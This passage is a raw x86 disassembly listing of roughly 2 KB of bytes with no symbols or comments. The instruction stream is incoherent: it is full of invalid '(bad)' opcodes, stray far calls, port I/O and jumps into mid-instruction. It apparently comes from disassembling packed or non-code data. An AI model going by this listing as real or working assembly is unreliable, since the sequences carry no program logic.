  43a49c:	or     DWORD PTR [eax+eiz*2],ebx
  43a49f:	les    esi,FWORD PTR [edx+0x2d48f5de]
  43a4a5:	cmp    BYTE PTR [edx-0x74],bl
  43a4a8:	shr    BYTE PTR [ebp-0x12df9119],0x18
  43a4af:	rcl    dh,1
  43a4b1:	mov    WORD PTR [ecx-0x5b4caba2],gs
  43a4b7:	sub    edx,eax
  43a4b9:	leave  
  43a4ba:	or     edx,ebx
  43a4bc:	sahf   
  43a4bd:	test   BYTE PTR [ebx-0xe],dh
  43a4c0:	push   esi
  43a4c1:	pop    eax
  43a4c2:	or     dh,ch
  43a4c4:	loope  0x43a4c7
  43a4c6:	mov    al,0xe1
  43a4c8:	xchg   bh,dh
  43a4ca:	push   esi
  43a4cb:	aas    
  43a4cc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43a4cd:	push   esi
  43a4ce:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43a4cf:	jl     0x43a53c
  43a4d1:	test   cl,dh
  43a4d3:	pusha  
  43a4d4:	(bad)  
  43a4d5:	jne    0x43a4d7
  43a4d7:	(bad)  
  43a4d9:	push   ecx
  43a4da:	pusha  
  43a4db:	pop    edx
  43a4dc:	inc    ebp
  43a4dd:	push   esp
  43a4de:	mov    al,ds:0xa86bb285
  43a4e3:	jge    0x43a4c5
  43a4e5:	adc    dl,BYTE PTR [esi+0x5b]
  43a4e8:	sub    BYTE PTR [edi],cl
  43a4ea:	dec    ebx
  43a4eb:	mov    al,ds:0x3d44fa34
  43a4f0:	mov    al,0xd0
  43a4f2:	sub    DWORD PTR [eax+0x10],edi
  43a4f5:	bnd call 0x1e5a4b41
  43a4fb:	add    al,0x90
  43a4fd:	or     DWORD PTR [eax+0x48ca49a6],esi
  43a503:	fsubr  DWORD PTR ds:0x366c88c0
  43a509:	ss adc al,0xc0
  43a50c:	push   cs
  43a50d:	dec    esp
  43a50e:	xor    ecx,DWORD PTR [edx+ecx*4+0x4240acff]
  43a515:	sti    
  43a516:	stos   BYTE PTR es:[edi],al
  43a517:	mov    bl,0xd0
  43a519:	test   BYTE PTR [eax+esi*4-0x54e59496],dl
  43a520:	mov    cl,BYTE PTR [edi+ebp*4-0x4949be2e]
  43a527:	popa   
  43a528:	das    
  43a529:	test   ecx,edx
  43a52b:	aad    0x4a
  43a52d:	push   cs
  43a52e:	pushw  es
  43a530:	add    esp,eax
  43a532:	shr    BYTE PTR [eax],cl
  43a534:	and    BYTE PTR [ecx+0xa],dl
  43a537:	add    al,BYTE PTR [edx]
  43a539:	sbb    al,0xd5
  43a53b:	or     al,0xaa
  43a53d:	sbb    eax,0x62342c56
  43a542:	clc    
  43a543:	inc    esi
  43a544:	pop    eax
  43a545:	sti    
  43a546:	dec    eax
  43a547:	arpl   WORD PTR [eax-0x476d6d48],bp
  43a54d:	ins    DWORD PTR es:[edi],dx
  43a54e:	push   ss
  43a54f:	mov    esp,0x245500
  43a554:	out    dx,al
  43a555:	mov    esi,0x99f5ba19
  43a55a:	shr    BYTE PTR [edi],0x42
  43a55d:	shr    BYTE PTR [edx+ecx*4],1
  43a560:	test   DWORD PTR [ebx+0xe966593],edx
  43a566:	mov    ?,WORD PTR [esi+0x4335861a]
  43a56c:	xor    DWORD PTR [eax],ecx
  43a56e:	inc    eax
  43a56f:	ror    eax,1
  43a571:	xchg   esp,eax
  43a572:	retf   
  43a573:	inc    ecx
  43a574:	jl     0x43a5ac
  43a576:	mov    cl,0xca
  43a578:	int    0xb1
  43a57a:	mov    ds:0x2a181ae7,al
  43a57f:	fisubr DWORD PTR [esi-0x6a89b89e]
  43a585:	or     eax,0xe45319e
  43a58a:	mov    DWORD PTR [esi+0x6e],edi
  43a58d:	mov    WORD PTR [ecx+0x56],es
  43a590:	push   ds
  43a591:	mov    al,0x38
  43a593:	jae    0x43a5d7
  43a595:	inc    ebp
  43a596:	push   ebp
  43a597:	xor    BYTE PTR [edx+eax*8+0x27],dl
  43a59b:	repnz mov esi,0x415260d0
  43a5a1:	sbb    DWORD PTR [esi-0x4e],ecx
  43a5a4:	adc    BYTE PTR [eax+ebp*4],ch
  43a5a7:	cmp    eax,0x26d6d976
  43a5ac:	in     eax,dx
  43a5ad:	call   0xe413:0x204581f
  43a5b4:	jg     0x43a5bc
  43a5b6:	aam    0xb6
  43a5b8:	sub    ebp,DWORD PTR [esp+edx*4+0x43]
  43a5bc:	jae    0x43a582
  43a5be:	gs (bad) 
  43a5c0:	fdiv   DWORD PTR [esp+ebx*1]
  43a5c3:	add    bh,BYTE PTR [edi]
  43a5c5:	add    BYTE PTR [ebp-0x7c],bh
  43a5c8:	jo     0x43a638
  43a5ca:	sub    ah,0xb
  43a5cd:	dec    esi
  43a5ce:	sub    eax,0x8a4b4bc3
  43a5d3:	and    eax,0x983626df
  43a5d8:	sub    DWORD PTR [ecx+0x2a5ccaae],ebx
  43a5de:	push   ss
  43a5df:	int    0x26
  43a5e1:	(bad)  
  43a5e2:	mov    ah,0x40
  43a5e4:	sub    dh,BYTE PTR [ebp+0x460b134f]
  43a5ea:	mov    esp,0xc832b478
  43a5ef:	xor    esi,0xacc0d04b
  43a5f5:	rol    ah,cl
  43a5f7:	in     eax,dx
  43a5f8:	add    al,0x3b
  43a5fa:	js     0x43a605
  43a5fc:	loope  0x43a593
  43a5fe:	pushf  
  43a5ff:	fnsave [ebp+0x58]
  43a602:	and    eax,0x1c55b074
  43a607:	dec    edx
  43a608:	aam    0xce
  43a60a:	out    dx,al
  43a60b:	lea    esp,[eax-0x793df546]
  43a611:	jge    0x43a637
  43a613:	push   ss
  43a614:	mov    ds:0x4ba158ab,al
  43a619:	imul   eax,DWORD PTR [ebp-0x12dea172],0x72
  43a620:	dec    edi
  43a621:	adc    dl,BYTE PTR [eax+0x21]
  43a624:	ret    
  43a625:	test   al,0xc0
  43a627:	or     BYTE PTR [edx-0x7f],ch
  43a62a:	mov    ch,0xcf
  43a62c:	jo     0x43a64e
  43a62e:	push   eax
  43a62f:	sbb    al,0x62
  43a631:	pop    eax
  43a632:	pusha  
  43a633:	inc    edx
  43a634:	jle    0x43a5c9
  43a636:	aam    0x8e
  43a638:	add    edi,esi
  43a63a:	lahf   
  43a63b:	dec    eax
  43a63c:	xchg   ecx,eax
  43a63d:	mov    bh,0xea
  43a63f:	xor    esi,DWORD PTR [ecx+0x12dd3eea]
  43a645:	jnp    0x43a5ca
  43a647:	xchg   edx,eax
  43a648:	mov    ah,0xc4
  43a64a:	add    dl,BYTE PTR [ebx-0x7935b20f]
  43a650:	sub    dh,BYTE PTR [ebx+ebx*2-0x257d7fb0]
  43a657:	cmp    al,0xc8
  43a659:	mov    BYTE PTR [eax+0x6],al
  43a65c:	ins    DWORD PTR es:[edi],dx
  43a65d:	and    DWORD PTR [ebp+ecx*8+0xe],ecx
  43a661:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43a662:	or     DWORD PTR [eax],esi
  43a664:	and    al,0x56
  43a666:	xor    ch,BYTE PTR [eax+0x32]
  43a669:	mov    ds:0xdac813e2,al
  43a66e:	call   0x68b55955
  43a673:	xor    al,0x8
  43a675:	inc    edx
  43a676:	and    dh,dh
  43a678:	mov    bl,0x7
  43a67a:	popa   
  43a67b:	pop    eax
  43a67c:	push   eax
  43a67d:	pop    eax
  43a67e:	fs or  al,0x19
  43a681:	ja     0x43a681
  43a683:	push   esp
  43a684:	retf   0xa752
  43a687:	and    BYTE PTR [edx+0x65],cl
  43a68a:	icebp  
  43a68b:	mov    al,ds:0x6710e306
  43a690:	call   0x2051:0xa4795cc7
  43a697:	fadd   st,st(6)
  43a699:	std    
  43a69a:	sub    eax,eax
  43a69c:	mov    ah,0x99
  43a69e:	gs shl BYTE PTR es:[ecx-0x2d583f16],1
  43a6a6:	push   esp
  43a6a7:	push   esp
  43a6a8:	aam    0x50
  43a6aa:	jmp    0xe1d:0xc8cf268f
  43a6b1:	neg    cl
  43a6b3:	mov    al,BYTE PTR [edx]
  43a6b5:	pop    ss
  43a6b6:	ins    BYTE PTR es:[edi],dx
  43a6b7:	nop
  43a6b8:	in     eax,0x2e
  43a6ba:	mov    bl,BYTE PTR [ecx]
  43a6bc:	shl    BYTE PTR [eax+ecx*1],1
  43a6bf:	mov    al,BYTE PTR [eax-0x2c]
  43a6c2:	mov    DWORD PTR [edx+0x46],eax
  43a6c5:	mov    ebx,0xf81ad014
  43a6ca:	mov    BYTE PTR fs:[ebx+esi*2+0x63],cl
  43a6cf:	xor    ebx,DWORD PTR [ebx]
  43a6d1:	pop    esp
  43a6d2:	mov    gs,esp
  43a6d4:	fadd   QWORD PTR [edx]
  43a6d6:	mov    al,ds:0x36a409b9
  43a6db:	sti    
  43a6dc:	and    eax,0x94b4eb82
  43a6e1:	retf   0x9a69
  43a6e4:	mov    WORD PTR [esi+0x1],gs
  43a6e7:	pop    es
  43a6e8:	mov    eax,0x94bc0233
  43a6ed:	or     eax,esi
  43a6ef:	and    ecx,DWORD PTR [ebx+ecx*8]
  43a6f2:	cmp    BYTE PTR [edx+0x21],0x1
  43a6f6:	lea    esp,[edx+edx*1-0x6dd3dee2]
  43a6fd:	adc    bl,ch
  43a6ff:	dec    edx
  43a700:	fsubr  DWORD PTR [edx]
  43a702:	mov    ds:0x770d8431,al
  43a707:	cmp    al,0x4c
  43a709:	add    bl,bl
  43a70b:	mov    esp,0xdb5076d6
  43a710:	sahf   
  43a711:	add    al,0xe0
  43a713:	cmc    
  43a714:	rol    esp,0x28
  43a717:	out    dx,al
  43a718:	add    DWORD PTR [eax-0x3ffda130],eax
  43a71e:	and    dl,ah
  43a720:	sbb    eax,DWORD PTR [ebx-0x1795d9ca]
  43a726:	sub    al,0xfc
  43a728:	xor    dh,bh
  43a72a:	sti    
  43a72b:	out    0x4e,eax
  43a72d:	rcl    al,1
  43a72f:	stos   BYTE PTR es:[edi],al
  43a730:	push   cs
  43a731:	push   ss
  43a732:	mov    bl,0xc
  43a734:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43a735:	inc    edi
  43a736:	add    eax,0x6cf184bc
  43a73b:	sti    
  43a73c:	fist   DWORD PTR [eax+0x32]
  43a73f:	retf   0x3aab
  43a742:	adc    bh,BYTE PTR [edi-0x2074fc80]
  43a748:	ror    BYTE PTR [edx-0x5ec8ff74],cl
  43a74e:	cmp    eax,0x35ca58b6
  43a753:	fild   WORD PTR [ebp-0x19ff4f05]
  43a759:	js     0x43a7a3
  43a75b:	jmp    0x36985566
  43a760:	push   ebx
  43a761:	ins    BYTE PTR es:[edi],dx
  43a762:	and    cl,0x8a
  43a765:	shr    BYTE PTR [edx+0x66813635],1
  43a76b:	mov    ds:0xac85e19d,al
  43a770:	add    ah,BYTE PTR [ecx+ebx*4+0x3e]
  43a774:	clc    
  43a775:	adc    eax,0x92839044
  43a77a:	ret    0x6c74
  43a77d:	inc    eax
  43a77e:	fld    QWORD PTR [edx-0x230b9566]
  43a784:	mov    edx,0x67b6004f
  43a789:	call   0x992e:0x5bff88a3
  43a790:	cli    
  43a791:	or     eax,0x8bdc6b69
  43a796:	(bad)  
  43a797:	cs adc esp,esi
  43a79a:	pop    eax
  43a79b:	repz sub BYTE PTR [ebp-0x4631a583],0x64
  43a7a3:	inc    edi
  43a7a4:	and    dh,BYTE PTR [edi+edi*4]
  43a7a7:	cmovno ebp,ebp
  43a7aa:	mov    ch,0x7e
  43a7ac:	mov    al,0xb4
  43a7ae:	mov    dl,0x87
  43a7b0:	(bad)  
  43a7b1:	or     bl,BYTE PTR [edx+edx*1-0x40]
  43a7b5:	stos   BYTE PTR es:[edi],al
  43a7b6:	dec    edi
  43a7b7:	mov    eax,0x80b33e49
  43a7bc:	sbb    eax,0x9c521e05
  43a7c1:	jae    0x43a74c
  43a7c3:	call   0xdc2441fa
  43a7c8:	int    0x58
  43a7ca:	or     ecx,0xc71bc00
  43a7d0:	cmp    bh,BYTE PTR [ebx+0x54]
  43a7d3:	pusha  
  43a7d4:	push   0x58bde6dd
  43a7d9:	mov    eax,ds:0xf5886cda
  43a7de:	dec    edx
  43a7df:	push   0xffffffb4
  43a7e1:	xchg   esp,eax
  43a7e2:	mov    al,ds:0xdb67a94e
  43a7e7:	push   ds
  43a7e8:	and    BYTE PTR [ebp+0x73],ch
  43a7eb:	call   0x6380:0xd0d15a77
  43a7f2:	push   ss
  43a7f3:	mov    al,0xe3
  43a7f5:	inc    eax
  43a7f6:	inc    eax
  43a7f7:	(bad)  
  43a7f8:	(bad)  
  43a7f9:	xor    ch,BYTE PTR [eax-0x53e47640]
  43a7ff:	cmp    eax,0x762c4480
  43a804:	hlt    
  43a805:	or     ebx,DWORD PTR [esi-0x7a]
  43a808:	aad    0xbb
  43a80a:	push   es
  43a80b:	add    ecx,DWORD PTR [ebx]
  43a80d:	dec    eax
  43a80e:	xchg   edx,eax
  43a80f:	mov    dh,0xb
  43a811:	push   edi
  43a812:	test   dl,bl
  43a814:	and    DWORD PTR [ebx],0xffffffca
  43a817:	loopne 0x43a88b
  43a819:	xor    al,BYTE PTR [ecx]
  43a81b:	repz mov es,WORD PTR [edx]
  43a81e:	xchg   BYTE PTR [ecx-0x79ff4b3a],bl
  43a824:	mov    eax,DWORD PTR [ebx+eax*4+0x24]
  43a828:	mov    eax,ds:0xd3b5ece8
  43a82d:	call   0x36667f9a
  43a832:	sub    al,dl
  43a834:	jb     0x43a820
  43a836:	lods   al,BYTE PTR ds:[esi]
  43a837:	adc    BYTE PTR [ebx],al
  43a839:	push   eax
  43a83a:	xor    dl,BYTE PTR [edx]
  43a83c:	cs push esi
  43a83e:	jb     0x43a87a
  43a840:	or     DWORD PTR [edi],ebp
  43a842:	popa   
  43a843:	xchg   edx,eax
  43a844:	mov    ebx,0xcdb3fe8c
  43a849:	push   ss
  43a84a:	adc    esp,DWORD PTR [eax-0x1d]
  43a84d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43a84e:	inc    eax
  43a84f:	(bad)  
  43a850:	pop    edi
  43a851:	outs   dx,BYTE PTR ds:[esi]
  43a852:	jbe    0x43a89a
  43a854:	imul   edx,DWORD PTR [edx+0x3],0x1c548b6d
  43a85b:	jle    0x43a88d
  43a85d:	jo     0x43a826
  43a85f:	or     DWORD PTR [ebx+0x78],0xffffff87
  43a863:	data16 std 
  43a865:	test   BYTE PTR [eax],0x3a
  43a868:	or     al,0x4a
  43a86a:	inc    eax
  43a86b:	sti    
  43a86c:	dec    ebp
  43a86d:	popa   
  43a86e:	inc    edi
  43a86f:	adc    cl,BYTE PTR [eax+0x51]
  43a872:	jmp    FWORD PTR [ecx+ecx*2+0x407eb087]
  43a879:	mov    ds:0x530e826,al
  43a87e:	das    
  43a87f:	mov    WORD PTR [edx-0x3c1d51fb],fs
  43a885:	or     BYTE PTR [ebp-0x64],bh
  43a888:	outs   dx,BYTE PTR ds:[esi]
  43a889:	fld    TBYTE PTR [edx]
  43a88b:	or     DWORD PTR [ecx-0x3771179b],ebp
  43a891:	data16 scas al,BYTE PTR es:[edi]
  43a893:	dec    eax
  43a894:	cmp    al,0x22
  43a896:	xor    bl,bh
  43a898:	push   ds
  43a899:	clc    
  43a89a:	in     eax,dx
  43a89b:	shr    DWORD PTR [edx],1
  43a89d:	xchg   edx,eax
  43a89e:	sbb    ch,BYTE PTR [ebx+ecx*2]
  43a8a1:	mov    WORD PTR [ebp+0x13],cs
  43a8a4:	xchg   edi,eax
  43a8a5:	and    BYTE PTR [esi-0x7c],bl
  43a8a8:	jle    0x43a8e1
  43a8aa:	or     al,0x4b
  43a8ac:	lock push ecx
  43a8ae:	dec    ebp
  43a8af:	xchg   edx,eax
  43a8b0:	out    0x28,al
  43a8b2:	jne    0x43a88c
  43a8b4:	cld    
  43a8b5:	jnp    0x43a86e
  43a8b7:	outs   dx,DWORD PTR ds:[esi]
  43a8b8:	jge    0x43a86c
  43a8ba:	data16 sbb al,0xe9
  43a8bd:	jle    0x43a850
  43a8bf:	and    dh,cl
  43a8c1:	mov    eax,0x32baa800
  43a8c6:	fisubr DWORD PTR [edi+esi*4-0x373da36c]
  43a8cd:	push   es
  43a8ce:	loope  0x43a865
  43a8d0:	fist   DWORD PTR [edx-0x2f]
  43a8d3:	lods   al,BYTE PTR ds:[esi]
  43a8d4:	call   0x61ef0ff7
  43a8d9:	inc    ebp
  43a8da:	das    
  43a8db:	inc    eax
  43a8dc:	add    edx,edi
  43a8de:	push   cs
  43a8df:	sbb    esp,DWORD PTR [eax+0x40]
  43a8e2:	les    ebp,FWORD PTR [esi]
  43a8e4:	ret    
  43a8e5:	jne    0x43a876
  43a8e7:	outs   dx,BYTE PTR ds:[esi]
  43a8e8:	(bad)  
  43a8e9:	mov    ah,0x87
  43a8eb:	jo     0x43a919
  43a8ed:	mov    ch,0xf6
  43a8ef:	dec    eax
  43a8f0:	jmp    0x64c5853b
  43a8f5:	les    esi,FWORD PTR [eax+ebp*1+0x50e3244d]
  43a8fc:	rol    BYTE PTR [ecx+0x426a6474],0x61
  43a903:	clc    
  43a904:	inc    esp
  43a905:	ins    BYTE PTR es:[edi],dx
  43a906:	mov    esi,0x9db89f33
  43a90b:	in     eax,0x80
  43a90d:	shl    DWORD PTR [ebp+0x384e2322],1
  43a913:	fistp  WORD PTR [edx]
  43a915:	in     eax,dx
  43a916:	sbb    BYTE PTR [edx-0x27bf683a],0x86
  43a91d:	pop    ebx
  43a91e:	bt     DWORD PTR [ecx+0x48],ecx
  43a922:	outs   dx,DWORD PTR ds:[esi]
  43a923:	push   eax
  43a924:	cmc    
  43a925:	retf   0x6d4
  43a928:	add    al,0xb1
  43a92a:	sub    eax,0x78fd6f54
  43a92f:	sub    eax,0x126210fd
  43a934:	sub    eax,0xe36b7f4
  43a939:	ret    
  43a93a:	add    esp,DWORD PTR ds:[ebx+edx*4+0x19e941d]
  43a942:	scas   eax,DWORD PTR es:[edi]
  43a943:	add    BYTE PTR [ebp-0x1e],ch
  43a946:	imul   BYTE PTR [ebx-0x5eea5250]
  43a94c:	lahf   
  43a94d:	aam    0x47
  43a94f:	out    0x76,al
  43a951:	into   
  43a952:	sub    bh,cl
  43a954:	sar    BYTE PTR [eax+0x8],0xe0
  43a958:	daa    
  43a959:	and    dh,BYTE PTR [ebx+ebx*4+0x7c]
  43a95d:	push   cs
  43a95e:	out    0x6,al
  43a960:	and    DWORD PTR [esp],esp
  43a963:	sbb    BYTE PTR [edi*1-0x231fa5be],bl
  43a96a:	adc    bl,bl
  43a96c:	mov    dl,BYTE PTR [esi]
  43a96e:	jecxz  0x43a977
  43a970:	ss ss push esp
  43a973:	pusha  
  43a974:	xor    DWORD PTR [edi+edi*1],edx
  43a977:	and    edx,DWORD PTR [eax+0x428080cf]
  43a97d:	pop    ecx
  43a97e:	and    dl,al
  43a980:	sbb    al,0xa0
  43a982:	lods   al,BYTE PTR ds:[esi]
  43a983:	cmp    eax,0x5258a47e
  43a988:	sti    
  43a989:	and    bl,BYTE PTR [esi]
  43a98b:	ins    BYTE PTR es:[edi],dx
  43a98c:	cmp    eax,0xc6942b42
  43a991:	xor    BYTE PTR [edx+0x68c130e9],0xcd
  43a998:	sar    BYTE PTR [edx],0xda
  43a99b:	mov    al,ds:0x5d439a29
  43a9a0:	adc    dl,0xfa
  43a9a3:	dec    eax
  43a9a4:	pop    eax
  43a9a5:	mov    cl,0x34
  43a9a7:	mov    al,ds:0xc301fa1e
  43a9ac:	mov    esp,0x27f6c68a
  43a9b1:	imul   esi,DWORD PTR [esi],0xf165ef4
  43a9b7:	add    bh,ch
  43a9b9:	mov    ds,eax
  43a9bb:	cld    
  43a9bc:	sbb    DWORD PTR ds:0x44dc96b2,edx
  43a9c2:	xchg   DWORD PTR [edx+ebp*4-0x76],ebp
  43a9c6:	dec    esi
  43a9c7:	sbb    ah,BYTE PTR ss:[ebp+eiz*4-0x52]
  43a9cc:	mov    esi,0x9a10d1e2
  43a9d1:	mov    esi,0xe8506860
  43a9d6:	add    eax,0x28991e02
  43a9db:	pop    esi
  43a9dc:	daa    
  43a9dd:	lock dec ebx
  43a9df:	push   cs
  43a9e0:	xchg   ebx,eax
  43a9e1:	test   al,0x45
  43a9e3:	mov    edx,0x3c67020e
  43a9e9:	inc    edx
  43a9ea:	push   ebp
  43a9eb:	sti    
  43a9ec:	and    al,0xe1
  43a9ee:	dec    esi
  43a9ef:	mov    esp,0xb26e8fda
  43a9f4:	cmp    bh,BYTE PTR ds:0xa16dca35
  43a9fa:	xchg   edi,eax
  43a9fb:	push   esi
  43a9fc:	ror    BYTE PTR [ecx-0x3],0x84
  43aa00:	and    BYTE PTR [esi+0x7c3367d0],0xb0
  43aa07:	cwde   
  43aa08:	rcr    DWORD PTR [edx+0x20],1
  43aa0b:	xchg   esp,eax
  43aa0c:	cs call 0x290a:0xc30eba30
  43aa14:	jge    0x43a9ea
  43aa16:	lods   al,BYTE PTR ds:[esi]
  43aa17:	fdivr  st,st(1)
  43aa19:	xor    al,0xd
  43aa1b:	sbb    eax,0x76baad0d
  43aa20:	hlt    
  43aa21:	xchg   ebx,eax
  43aa22:	or     BYTE PTR [edx],al
  43aa24:	jb     0x43aa91
  43aa26:	into   
  43aa27:	cs or  ebp,ecx
  43aa2a:	add    DWORD PTR [eax-0x41e0c1cf],esp
  43aa30:	sub    BYTE PTR [ebp-0x55f6ca00],bh
  43aa36:	rcr    DWORD PTR [ecx+0x7e],cl
  43aa39:	ins    DWORD PTR es:[edi],dx
  43aa3a:	loopne 0x43aa72
  43aa3c:	pop    eax
  43aa3d:	outs   dx,DWORD PTR ds:[esi]
  43aa3e:	stos   BYTE PTR es:[edi],al
  43aa3f:	mov    fs,ecx
  43aa41:	inc    esp
  43aa42:	jle    0x43a9cd
  43aa44:	mov    ecx,DWORD PTR [edx-0x71]
  43aa47:	mov    al,ds:0x6acb88d6
  43aa4c:	daa    
  43aa4d:	ss nop
  43aa4f:	push   ecx
  43aa50:	xlat   BYTE PTR ds:[ebx]
  43aa51:	xchg   BYTE PTR [esi+0x16760a2f],dh
  43aa57:	cs jo  0x43aac6
  43aa5a:	(bad)  
  43aa5b:	mov    esp,0xda186689
  43aa60:	retf   0xe000
  43aa63:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43aa64:	mov    edx,0x5afe7048
  43aa69:	mov    ah,0x3e
  43aa6b:	inc    edx
  43aa6c:	(bad)  
  43aa6e:	xor    DWORD PTR [edi-0x7e],ebx
  43aa71:	sbb    bl,BYTE PTR [ecx+ebp*2-0x334e5914]
  43aa78:	mov    dl,0xe0
  43aa7a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43aa7b:	inc    esi
  43aa7c:	pop    ecx
  43aa7d:	(bad)  
  43aa7f:	dec    esp
  43aa80:	ss out dx,eax
  43aa82:	stos   BYTE PTR es:[edi],al
  43aa83:	bound  esi,QWORD PTR [esi-0x5d]
  43aa86:	jmp    0x2e9a36c0
  43aa8b:	pop    ebp
  43aa8c:	dec    edx
  43aa8d:	xor    BYTE PTR [ebp+0x21745187],0xd2
  43aa94:	and    dh,dl
  43aa96:	adc    al,0x32
  43aa98:	jge    0x43aa3e
  43aa9a:	shl    DWORD PTR [esi],1
  43aa9c:	ror    BYTE PTR [eax-0x32],1
  43aa9f:	jl     0x43aaa0
  43aaa1:	xor    al,0xcb
  43aaa3:	(bad)  
  43aaa4:	ds pop eax
  43aaa6:	js     0x43aacd
  43aaa8:	mov    edx,0x5f884e0d
  43aaad:	cli    
  43aaae:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43aaaf:	add    BYTE PTR [edi-0x6e],0xb0
  43aab3:	jo     0x43ab34
  43aab5:	pop    es
  43aab6:	hlt    
  43aab7:	or     al,0xbc
  43aab9:	into   
  43aaba:	jle    0x43ab25
  43aabc:	push   0xfffffffe
  43aabe:	pop    eax
  43aabf:	add    esi,eax
  43aac1:	pop    ecx
  43aac2:	inc    edx
  43aac3:	enter  0x6fae,0x51
  43aac7:	loop   0x43aa51
  43aac9:	cli    
  43aaca:	or     al,0xe2
  43aacc:	lods   al,BYTE PTR ds:[esi]
  43aacd:	test   al,0x24
  43aacf:	test   DWORD PTR [eax+0x40],eax
  43aad2:	cld    
  43aad3:	es hlt 
  43aad5:	out    dx,al
  43aad6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43aad7:	adc    eax,0x1d866800
  43aadc:	pop    ecx
  43aadd:	fmul   DWORD PTR [esi]
  43aadf:	retf   0xb8a1
  43aae2:	xor    al,0x87
  43aae4:	dec    esp
  43aae5:	ja     0x43ab2f
  43aae7:	add    BYTE PTR [ebx-0x7925d158],ah
  43aaed:	into   
  43aaee:	jle    0x43aaf2
  43aaf0:	mov    al,0xcb
  43aaf2:	mov    ah,0x4a
  43aaf4:	push   esi
  43aaf5:	pop    esi
  43aaf6:	push   ss
  43aaf7:	add    dl,BYTE PTR [eax+0x10]
  43aafa:	mov    al,ds:0x4ec7454d
  43aaff:	and    al,0xaa
  43ab01:	das    
  43ab02:	shl    BYTE PTR [ecx+0x61],1
  43ab05:	nop
  43ab06:	jbe    0x43ab24
  43ab08:	sahf   
  43ab09:	enter  0x2c1a,0x6c
  43ab0d:	aam    0x98
  43ab0f:	in     al,dx
  43ab10:	and    ecx,DWORD PTR [edi+ebx*1-0x7bd3cb54]
  43ab17:	xor    cl,BYTE PTR [edi]
  43ab19:	inc    esi
  43ab1a:	cmp    eax,0xb61ada03
  43ab1f:	add    eax,0xdc01c2ee
  43ab24:	cmp    BYTE PTR [edi],al
  43ab26:	xchg   esp,eax
  43ab27:	call   0xa562:0xb0fa3649
  43ab2e:	shl    BYTE PTR [ecx-0x7733c673],0x26
  43ab35:	neg    BYTE PTR [ebx]
  43ab37:	inc    esp
  43ab38:	and    DWORD PTR [edx-0x61],ebx
  43ab3b:	dec    esp
  43ab3c:	pusha  
  43ab3d:	push   es
  43ab3e:	or     BYTE PTR cs:[edi+eiz*8+0x5d],ch
  43ab43:	push   eax
  43ab44:	ins    BYTE PTR es:[edi],dx
  43ab45:	and    eax,DWORD PTR [eax]
  43ab47:	sbb    ecx,edx
  43ab49:	out    dx,al
  43ab4a:	xchg   BYTE PTR [ebx-0x6b],cl
  43ab4d:	and    al,0x9e
  43ab4f:	je     0x43aaec
  43ab51:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43ab52:	in     al,0xb5
  43ab54:	xlat   BYTE PTR ds:[ebx]
  43ab55:	ror    BYTE PTR [edi],0xa0
  43ab58:	repnz dec ebp
  43ab5a:	nop
  43ab5b:	aas    
  43ab5c:	mov    al,0x3a
  43ab5e:	lds    ecx,FWORD PTR [edi]
  43ab60:	sbb    BYTE PTR [edi],ch
  43ab62:	push   0x54c3be9a
  43ab67:	cmp    al,0x32
  43ab69:	mov    cl,0xb5
  43ab6b:	mov    ch,0x70
  43ab6d:	xchg   esi,eax
  43ab6e:	hlt    
  43ab6f:	adc    eax,0x92ad5401
  43ab74:	aam    0x22
  43ab76:	jnp    0x43abc0
  43ab78:	hlt    
  43ab79:	jecxz  0x43ab3b
  43ab7b:	jo     0x43ab85
  43ab7d:	cli    
  43ab7e:	xchg   ebp,eax
  43ab7f:	jl     0x43ab83
  43ab81:	lock and BYTE PTR [ecx+edi*8-0x428a41d5],0xeb
  43ab8a:	push   ebx
  43ab8b:	cli    
  43ab8c:	or     DWORD PTR [esi],esi
  43ab8e:	sub    bh,dl
  43ab90:	or     bl,dh
  43ab92:	adc    al,0xbe
  43ab94:	add    DWORD PTR [esi],0xa0024242
  43ab9a:	inc    ecx
  43ab9b:	ret    
  43ab9c:	(bad)  
  43ab9d:	inc    esp
  43ab9e:	sbb    bl,BYTE PTR [edx*8+0x3e640c52]
  43aba5:	int3   
  43aba6:	xchg   esi,eax
  43aba7:	mov    al,0x43
  43aba9:	test   al,0x6
  43abab:	aam    0xf4
  43abad:	sub    al,bl
  43abaf:	and    DWORD PTR [edi+0x3438682c],edi
  43abb5:	mov    esi,0x54afb664
  43abba:	out    0x74,eax
  43abbc:	not    BYTE PTR [eax]
  43abbe:	(bad)  
  43abbf:	and    DWORD PTR [esi+edi*8+0x68],esi
  43abc3:	pop    esp
  43abc4:	mov    esi,0x2280d6b1
  43abc9:	or     edx,DWORD PTR ds:0x44ca6fdc
  43abcf:	imul   esp,DWORD PTR [eax+0x44f0a670],0x52
  43abd6:	out    dx,al
  43abd7:	je     0x43ac3d
  43abd9:	pusha  
  43abda:	push   ebp
  43abdb:	pop    esi
  43abdc:	lock retf 0xaa24
  43abe0:	adc    DWORD PTR [edx],edx
  43abe2:	aam    0xe0
  43abe4:	adc    cl,ah
  43abe6:	je     0x43abb4
  43abe8:	popa   
  43abe9:	adc    BYTE PTR [eax-0x60],dl
  43abec:	and    cl,BYTE PTR [esi+0x1b]
  43abef:	mov    BYTE PTR [edx+0x525ad01e],al
  43abf5:	fadd   QWORD PTR [edx-0x40]
  43abf8:	mov    ah,0x2e
  43abfa:	jecxz  0x43ac31
  43abfc:	mov    DWORD PTR [edi-0x74],ecx
  43abff:	stc    
  43ac00:	(bad)  
  43ac01:	pop    edx
  43ac02:	push   ebp
  43ac03:	nop
  43ac04:	mov    BYTE PTR [edi],al
  43ac06:	adc    ch,BYTE PTR [ebp-0x2476634]
  43ac0c:	(bad)  
  43ac0d:	rcl    BYTE PTR [ebp+eiz*4+0x2],1
  43ac11:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43ac12:	jbe    0x43abec
  43ac14:	jbe    0x43abdc
  43ac16:	xchg   ebx,eax
  43ac17:	or     eax,0xb89e3055
  43ac1c:	nop
  43ac1d:	dec    eax
  43ac1e:	mov    dl,0xe
  43ac20:	mov    dh,0x86
